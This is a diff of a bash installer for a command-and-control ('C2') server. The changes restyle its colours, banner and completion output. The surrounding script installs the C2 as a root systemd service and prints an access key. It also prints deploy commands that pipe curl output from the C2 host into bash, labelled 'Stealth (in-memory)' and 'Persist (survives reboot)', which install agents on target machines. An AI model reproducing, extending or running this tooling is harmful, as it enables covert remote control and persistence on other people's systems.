@@ -1,31 +1,34 @@
 #!/bin/bash
 set -e
 
-C="\033[1;36m"
-G="\033[1;32m"
-Y="\033[1;33m"
-R="\033[1;31m"
-P="\033[1;35m"
+BG="\033[48;5;236m"
+FROST="\033[38;5;110m"
+AURORA="\033[38;5;108m"
+SNOW="\033[38;5;255m"
+PURPLE="\033[38;5;139m"
+YELLOW="\033[38;5;222m"
+RED="\033[38;5;174m"
 N="\033[0m"
 
 INSTALL_DIR="/opt/6319"
 SERVICE_NAME="6319-c2"
 
-echo -e "${P}"
+echo ""
+echo -e "${FROST}"
 cat << 'BANNER'
-    ██████╗ ██████╗  ██╗ █████╗ 
-   ██╔════╝╚════██╗███║██╔══██╗
-   ██████╗  █████╔╝╚██║╚██████║
-   ██╔═══╝ ╚═══██╗ ██║ ╚═══██║
-   ╚██████╗██████╔╝ ██║ █████╔╝
-    ╚═════╝╚═════╝  ╚═╝ ╚════╝ 
-   C2 Server v3.2 - Installer
+     ████████╗ ██████╗  ███╗  █████╗ 
+     ██╔═════╝ ╚════██╗ ███║ ██╔══██╗
+     ████████╗  █████╔╝ ███║ ╚██████║
+     ██╔═════╝  ╚═══██╗ ███║  ╚═══██║
+     ████████╗ ██████╔╝ ███║  █████╔╝
+     ╚═══════╝ ╚═════╝  ╚══╝  ╚════╝ 
 BANNER
-echo -e "${N}"
+echo -e "${PURPLE}        C2 Server v3.2 Installer${N}"
+echo ""
 
-info() { echo -e "${G}[+]${N} $1"; }
-warn() { echo -e "${Y}[!]${N} $1"; }
-err() { echo -e "${R}[-]${N} $1"; exit 1; }
+info() { echo -e "${AURORA}[+]${N} $1"; }
+warn() { echo -e "${YELLOW}[!]${N} $1"; }
+err() { echo -e "${RED}[-]${N} $1"; exit 1; }
 
 [[ $EUID -ne 0 ]] && err "Run as root: sudo bash install.sh"
 
@@ -610,27 +613,28 @@ SERVER_IP=$(hostname -I | awk '{print $1}')
 
 if systemctl is-active --quiet ${SERVICE_NAME}; then
     echo ""
-    echo -e "${G}========================================${N}"
-    echo -e "${G}   6319 C2 Server v3.2 INSTALLED!${N}"
-    echo -e "${G}========================================${N}"
+    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
+    echo -e "${AURORA}   6319 C2 Server v3.2 INSTALLED${N}"
+    echo -e "${FROST}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${N}"
     echo ""
-    echo -e "${P}[ACCESS - SAVE THIS!]${N}"
-    echo -e "  Login:     ${C}http://${SERVER_IP}:${C2_WEB_PORT}/${LOGIN_PATH}${N}"
-    echo -e "  Dashboard: ${C}http://${SERVER_IP}:${C2_WEB_PORT}/${DASHBOARD_PATH}${N}"
-    echo -e "  Key:       ${Y}${AUTH_KEY}${N}"
-    echo -e "  Cookie:    ${C}24 hours${N}"
+    echo -e "${PURPLE}[ACCESS - SAVE THIS]${N}"
+    echo -e "  Login:     ${FROST}http://${SERVER_IP}:${C2_WEB_PORT}/${LOGIN_PATH}${N}"
+    echo -e "  Dashboard: ${FROST}http://${SERVER_IP}:${C2_WEB_PORT}/${DASHBOARD_PATH}${N}"
+    echo -e "  Key:       ${YELLOW}${AUTH_KEY}${N}"
+    echo -e "  Session:   ${FROST}24 hours${N}"
     echo ""
-    echo -e "${G}[DEPLOY COMMANDS]${N}"
+    echo -e "${PURPLE}[DEPLOY COMMANDS]${N}"
     echo ""
-    echo -e "${Y}Stealth (in-memory):${N}"
-    echo -e "  bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${STEALTH_PATH})\""
+    echo -e "${SNOW}Stealth (in-memory):${N}"
+    echo -e "  ${FROST}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${STEALTH_PATH})\"${N}"
     echo ""
-    echo -e "${Y}Persist (survives reboot):${N}"
-    echo -e "  bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${PERSIST_PATH})\""
+    echo -e "${SNOW}Persist (survives reboot):${N}"
+    echo -e "  ${FROST}bash -c \"\$(curl -fsSL http://${SERVER_IP}:${C2_WEB_PORT}/${PERSIST_PATH})\"${N}"
     echo ""
-    echo -e "Agents: ${C}port ${C2_SOCKET_PORT} (encrypted)${N}"
-    echo -e "Service: ${C}systemctl status ${SERVICE_NAME}${N}"
-    echo -e "Logs: ${C}journalctl -u ${SERVICE_NAME} -f${N}"
+    echo -e "${PURPLE}[SERVICE]${N}"
+    echo -e "  Port:    ${FROST}${C2_WEB_PORT}${N} (web) / ${FROST}${C2_SOCKET_PORT}${N} (agents)"
+    echo -e "  Status:  ${FROST}systemctl status ${SERVICE_NAME}${N}"
+    echo -e "  Logs:    ${FROST}journalctl -u ${SERVICE_NAME} -f${N}"
     echo ""
 else
     err "Service failed to start. Check: journalctl -u ${SERVICE_NAME} -n 50"
